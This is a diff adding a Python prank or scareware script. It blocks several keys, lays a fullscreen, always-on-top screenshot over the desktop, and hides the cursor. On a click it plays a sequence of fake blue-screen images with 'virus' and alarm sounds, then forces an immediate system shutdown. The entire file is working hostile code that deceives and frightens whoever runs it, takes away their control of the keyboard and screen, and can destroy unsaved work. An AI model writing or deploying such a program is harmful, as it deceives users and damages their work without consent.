@@ -1,0 +1,104 @@
+import winsound
+from tkinter import*
+import pyautogui
+import time
+import os,sys
+from PIL import Image, ImageTk #diaxeirisi eikonwn
+import keyboard
+keyboard.block_key('a')
+keyboard.block_key('b')
+keyboard.block_key('ctrl')
+keyboard.block_key('alt')
+ISRUN=FALSE
+
+
+
+
+time.sleep(5)
+
+dir=os.path.dirname(os.path.abspath(sys.argv[0]))
+print(dir)
+
+pyautogui.hotkey("win","d")    #ta pataei gia na mas steilei sto desktop
+
+time.sleep(0.7)
+img = pyautogui.screenshot('desktop.png')
+
+root=Tk()
+root.geometry("{}x{}+0+0".format(root.winfo_screenwidth(),root.winfo_screenheight()))
+
+
+bg=PhotoImage(file="desktop.png")
+bgimage = Label(root,image=bg, width=root.winfo_screenwidth(),height=root.winfo_screenheight(),borderwidth=0)
+bgimage.place(x=0,y=0)
+
+
+
+
+
+def initiate(event):
+    global ISRUN
+    if ISRUN==FALSE:
+        ISRUN=TRUE
+        time.sleep(1)
+        updateImg(1,4)
+        updateImg(2,0.01)
+        winsound.PlaySound(dir + '/df.wav', winsound.SND_ASYNC)
+        updateImg(3,7)
+        updateImg(4,0.01)
+        winsound.PlaySound(dir+'/noise1.wav',winsound.SND_ASYNC)
+        updateImg(3,3)
+        winsound.PlaySound(dir + '/noise2.wav', winsound.SND_ASYNC)
+        updateImg(6,0.01)
+        updateImg(3,1.5)
+        winsound.PlaySound(dir + '/noise3.wav', winsound.SND_ASYNC)
+        updateImg(4,0.01)
+        updateImg(3,0.75)
+        winsound.PlaySound(dir + '/final.wav', winsound.SND_ASYNC)
+        updateImg(5,3)
+        winsound.PlaySound(dir + '/usb-connect-disconnect-windows-11.mp3', winsound.SND_ASYNC)
+        updateImg(7, 2.5)
+        updateImg(2, 3)
+        winsound.PlaySound(dir + '/virus-noise.wav', winsound.SND_ASYNC)
+        updateImg(9, 2)
+        winsound.PlaySound(dir + '/another-virus-pyrus.wav', winsound.SND_ASYNC)
+        updateImg(10,10)
+        updateImg(11, 1)
+        updateImg(12, 1)
+        updateImg(13, 1)
+        updateImg(14, 1)
+        updateImg(15, 1)
+        winsound.PlaySound(dir + '/bio-alarm.wav', winsound.SND_ASYNC)
+        time.sleep(6)
+        os.system("shutdown /s /t 0")
+
+
+
+
+
+
+
+
+def updateImg(number, sleepNum):  #poia foto, kai gia poso tha einai`
+    imgName= dir+"/bsod"+str(number)+".png"   #onoma eikonas
+    img= Image.open(imgName).resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.LANCZOS)
+    bg1= ImageTk.PhotoImage(img)
+
+
+    bgimage.configure(image=bg1, cursor='none')
+    bgimage.image = bg1
+    root.update()
+    time.sleep(sleepNum)
+
+
+
+bgimage.bind('<Button-1>',initiate)
+root.attributes('-topmost',True)
+root.attributes("-fullscreen", True)
+
+
+
+
+
+
+root.mainloop()
